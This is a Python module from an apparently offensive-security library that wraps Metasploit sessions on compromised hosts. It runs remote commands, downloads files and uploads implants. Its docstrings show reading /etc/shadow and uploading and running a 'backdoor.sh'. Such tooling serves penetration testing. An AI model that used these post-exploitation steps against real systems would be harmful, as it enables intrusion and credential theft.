"""Kill module - a confirmed hit (active session on compromised target).

The Kill class wraps msf.Session with themed methods for post-exploitation
operations.

Example:
    >>> kill = contract.execute()
    >>> if kill:
    ...     print(f"Target eliminated: {kill}")
    ...     print(kill.interrogate("whoami"))
    ...     print(kill.interrogate("cat /etc/passwd"))
    ...     kill.extract("/etc/shadow", "/tmp/shadow.txt")
    ...     kill.silence()  # Clean up
"""

from __future__ import annotations

import os
from typing import TYPE_CHECKING, Optional

from assassinate.console import print_kill
from assassinate.log_config import get_logger

if TYPE_CHECKING:
    import msf
    from assassinate.target import Target

logger = get_logger("kill")


class Kill:
    """A confirmed kill (active session on compromised target).

    Wraps msf.Session with themed methods for interrogation (commands),
    extraction (file download), implantation (file upload), and silencing
    (session termination).

    Attributes:
        target: The Target that was compromised
        id: Session ID
        type: Session type (shell, meterpreter)
        confirmed: Whether the session is still alive

    Example:
        >>> kill = contract.execute()
        >>> if kill:
        ...     whoami = kill.interrogate("whoami")
        ...     print(f"Compromised as: {whoami}")
        ...
        ...     # Extract sensitive files
        ...     kill.extract("/etc/shadow", "loot/shadow.txt")
        ...
        ...     # Clean up
        ...     kill.silence()
    """

    __slots__ = ("_session", "target", "_via_weapon", "_via_payload")

    def __init__(
        self,
        session: "msf.Session",
        target: Optional["Target"] = None,
        via_weapon: Optional[str] = None,
        via_payload: Optional[str] = None,
    ):
        """Initialize a Kill from an MSF session.

        Args:
            session: The underlying msf.Session
            target: The Target that was compromised (optional)
            via_weapon: Weapon used for the kill (optional)
            via_payload: Payload used for the kill (optional)
        """
        self._session = session
        self.target = target
        self._via_weapon = via_weapon
        self._via_payload = via_payload
        logger.success(
            f"Kill confirmed: session {session.sid} @ {session.host}:{session.port} via {via_weapon or 'unknown'}"
        )

    # =========================================================================
    # Identity
    # =========================================================================

    @property
    def id(self) -> int:
        """Session ID."""
        return self._session.sid

    @property
    def type(self) -> str:
        """Session type (shell, meterpreter)."""
        return self._session.session_type

    @property
    def confirmed(self) -> bool:
        """Whether the session is still alive."""
        try:
            return self._session.alive
        except Exception as e:
            logger.debug(f"Session alive check failed: {e}")
            return False

    @property
    def is_meterpreter(self) -> bool:
        """Whether this is a meterpreter session."""
        return "meterpreter" in self.type.lower()

    @property
    def is_shell(self) -> bool:
        """Whether this is a basic shell session."""
        return "shell" in self.type.lower()

    # =========================================================================
    # Target Info
    # =========================================================================

    @property
    def host(self) -> str:
        """Target host IP address."""
        return self._session.host

    @property
    def port(self) -> int:
        """Target port."""
        return self._session.port

    @property
    def via_exploit(self) -> str:
        """Exploit that created this session."""
        return self._via_weapon or self._session.via_exploit

    @property
    def via_payload(self) -> str:
        """Payload used for this session."""
        return self._via_payload or self._session.via_payload

    @property
    def info(self) -> str:
        """Session info string."""
        return self._session.info

    # =========================================================================
    # Interrogation (Command Execution)
    # =========================================================================

    def interrogate(self, cmd: str, timeout: Optional[int] = None) -> str:
        """Execute a command and return the output.

        The primary method for interacting with a compromised target.
        Sends a command and waits for output.

        Args:
            cmd: Command to execute
            timeout: Optional timeout in seconds

        Returns:
            Command output as string

        Example:
            >>> whoami = kill.interrogate("whoami")
            >>> print(f"Running as: {whoami.strip()}")

            >>> passwd = kill.interrogate("cat /etc/passwd")
            >>> for line in passwd.splitlines():
            ...     print(line)
        """
        logger.debug(f"Interrogating kill {self.id}: {cmd[:50] + '...' if len(cmd) > 50 else cmd}")
        try:
            result = self._session.run_cmd(cmd, timeout)
            logger.debug(f"Interrogation returned {len(result)} chars")
            return result
        except Exception as e:
            logger.error(f"Interrogation failed on kill {self.id}: {e}")
            raise

    def read(self, length: Optional[int] = None) -> str:
        """Read available data from the session buffer.

        Args:
            length: Maximum bytes to read (None for all available)

        Returns:
            Available data as string
        """
        return self._session.read(length)

    def write(self, data: str) -> int:
        """Write raw data to the session.

        Args:
            data: Data to write

        Returns:
            Number of bytes written
        """
        return self._session.write(data)

    # =========================================================================
    # File Operations
    # =========================================================================

    def extract(
        self,
        remote_path: str,
        local_path: Optional[str] = None,
    ) -> str:
        """Download a file from the target.

        Args:
            remote_path: Path on the target system
            local_path: Local destination (default: use filename in current dir)

        Returns:
            Local path where file was saved

        Example:
            >>> # Extract to current directory
            >>> kill.extract("/etc/passwd")

            >>> # Extract to specific location
            >>> kill.extract("/etc/shadow", "/tmp/loot/shadow.txt")
        """
        if local_path is None:
            local_path = os.path.basename(remote_path)

        logger.info(f"Extracting {remote_path} from kill {self.id} to {local_path}")

        # Ensure local directory exists
        local_dir = os.path.dirname(local_path)
        if local_dir:
            os.makedirs(local_dir, exist_ok=True)

        try:
            if self.is_meterpreter:
                # Use meterpreter download
                logger.debug("Using meterpreter download")
                self._session._rust.fs_download(remote_path, local_path)
            else:
                # For shell sessions, use cat and write locally
                logger.debug("Using shell cat method")
                content = self.interrogate(f"cat {remote_path}")
                with open(local_path, "w") as f:
                    f.write(content)

            logger.success(f"Extraction complete: {local_path}")
            return local_path
        except Exception as e:
            logger.error(f"Extraction failed: {e}")
            raise

    def implant(self, local_path: str, remote_path: str) -> bool:
        """Upload a file to the target.

        Args:
            local_path: Path to local file
            remote_path: Destination path on target

        Returns:
            True if successful

        Example:
            >>> kill.implant("backdoor.sh", "/tmp/backdoor.sh")
            >>> kill.interrogate("chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh")
        """
        logger.info(f"Implanting {local_path} to kill {self.id} as {remote_path}")

        try:
            if self.is_meterpreter:
                # Use meterpreter upload
                logger.debug("Using meterpreter upload")
                self._session._rust.fs_upload(local_path, remote_path)
            else:
                # For shell sessions, base64 encode and decode on target
                logger.debug("Using shell base64 method")
                import base64
                with open(local_path, "rb") as f:
                    content = base64.b64encode(f.read()).decode()

                # Upload using echo and base64 decode
                self.interrogate(f"echo '{content}' | base64 -d > {remote_path}")

            logger.success(f"Implant complete: {remote_path}")
            return True
        except Exception as e:
            logger.error(f"Implant failed: {e}")
            raise

    # =========================================================================
    # Session Control
    # =========================================================================

    def silence(self) -> None:
        """Kill this session (clean up).

        Terminates the session, removing the connection to the target.
        Use when you're done with the compromised system.

        Example:
            >>> # Always clean up when done
            >>> try:
            ...     kill.interrogate("whoami")
            ... finally:
            ...     kill.silence()
        """
        logger.info(f"Silencing kill {self.id} @ {self.host}")
        try:
            self._session.kill()
            logger.info(f"Kill {self.id} silenced")
        except Exception as e:
            logger.warning(f"Failed to silence kill {self.id}: {e}")

    # =========================================================================
    # Advanced / Future Features
    # =========================================================================

    def escalate(self) -> Optional["Kill"]:
        """Attempt privilege escalation (future feature).

        Returns:
            New Kill with elevated privileges, or None

        Note:
            This is a placeholder for future implementation.
        """
        raise NotImplementedError(
            "Privilege escalation automation is not yet implemented. "
            "Use post-exploitation modules manually."
        )

    def persist(self) -> bool:
        """Install persistence mechanism (future feature).

        Returns:
            True if persistence installed

        Note:
            This is a placeholder for future implementation.
        """
        raise NotImplementedError(
            "Persistence automation is not yet implemented. "
            "Use post-exploitation modules manually."
        )

    def pivot(self, target: str) -> Optional["Kill"]:
        """Pivot to another target through this session (future feature).

        Args:
            target: IP or hostname of next target

        Returns:
            Kill for the new target, or None

        Note:
            This is a placeholder for future implementation.
        """
        raise NotImplementedError(
            "Pivoting automation is not yet implemented. "
            "Use routing and auxiliary modules manually."
        )

    # =========================================================================
    # Raw Access
    # =========================================================================

    @property
    def session(self) -> "msf.Session":
        """Access underlying msf.Session for advanced operations.

        Use this when you need access to methods not exposed through Kill.

        Example:
            >>> # Access meterpreter-specific methods
            >>> if kill.is_meterpreter:
            ...     kill.session._rust.fs_pwd()
        """
        return self._session

    # =========================================================================
    # Display
    # =========================================================================

    def summary(self, full: bool = False) -> str:
        """Get a detailed multi-line summary of this kill.

        Args:
            full: If True, show all vulnerabilities without truncation.

        Returns:
            Formatted string with full kill details

        Example:
            >>> print(kill.summary())
            >>> kill.p(full=True)  # Show all vulns
        """
        status = "✓ CONFIRMED" if self.confirmed else "✗ LOST"
        lines = [
            f"{'═' * 60}",
            f"  Kill #{self.id} - {self.type.upper()}",
            f"{'═' * 60}",
            f"",
            f"  Status: {status}",
            f"  Target: {self.host}:{self.port}",
        ]

        if self.via_exploit:
            lines.append(f"")
            lines.append(f"  Attack Vector:")
            lines.append(f"    Exploit: {self.via_exploit}")
        if self.via_payload:
            lines.append(f"    Payload: {self.via_payload}")

        if self.target and self.target.vulns:
            lines.append(f"")
            lines.append(f"  Known Vulnerabilities:")
            vuln_limit = None if full else 5
            for vuln in self.target.vulns[:vuln_limit]:
                lines.append(f"    • {vuln}")
            if not full and len(self.target.vulns) > 5:
                lines.append(f"    ... and {len(self.target.vulns) - 5} more")

        # Add session info if meterpreter
        if self.is_meterpreter and self.confirmed:
            lines.append(f"")
            lines.append(f"  Meterpreter Info:")
            try:
                uid = self._session._rust.sys_getuid()
                lines.append(f"    User: {uid}")
            except Exception:
                pass
            try:
                sysinfo = self._session._rust.sys_sysinfo()
                if sysinfo.get("Computer"):
                    lines.append(f"    Computer: {sysinfo.get('Computer')}")
                if sysinfo.get("OS"):
                    lines.append(f"    OS: {sysinfo.get('OS')}")
            except Exception:
                pass

        lines.append(f"{'─' * 60}")
        return "\n".join(lines)

    def p(self, full: bool = False) -> None:
        """Print rich formatted summary.

        Args:
            full: If True, show all vulnerabilities without truncation.
        """
        # Gather meterpreter info if available
        meterpreter_info = None
        if self.is_meterpreter and self.confirmed:
            meterpreter_info = {}
            try:
                meterpreter_info["user"] = self._session._rust.sys_getuid()
            except Exception:
                pass
            try:
                sysinfo = self._session._rust.sys_sysinfo()
                meterpreter_info["computer"] = sysinfo.get("Computer")
                meterpreter_info["os"] = sysinfo.get("OS")
            except Exception:
                pass

        print_kill(
            kill_id=self.id,
            kill_type=self.type,
            host=self.host,
            port=self.port,
            confirmed=self.confirmed,
            via_exploit=self.via_exploit,
            via_payload=self.via_payload,
            vulns=self.target.vulns if self.target else None,
            meterpreter_info=meterpreter_info if meterpreter_info else None,
            full=full,
        )

    def __repr__(self) -> str:
        status = "confirmed" if self.confirmed else "lost"
        parts = [f"<Kill #{self.id}: {self.type} @ {self.host}:{self.port}"]
        if self.via_exploit:
            exploit_name = self.via_exploit.split('/')[-1] if '/' in self.via_exploit else self.via_exploit
            parts.append(f"via={exploit_name}")
        parts.append(f"[{status}]")
        return " ".join(parts) + ">"

    def __str__(self) -> str:
        return f"Kill #{self.id} ({self.type} @ {self.host})"

    def __bool__(self) -> bool:
        """Kill is truthy if session is confirmed (alive)."""
        return self.confirmed

    def __eq__(self, other: object) -> bool:
        if isinstance(other, Kill):
            return self.id == other.id
        if isinstance(other, int):
            return self.id == other
        return False

    def __hash__(self) -> int:
        return hash(self.id)
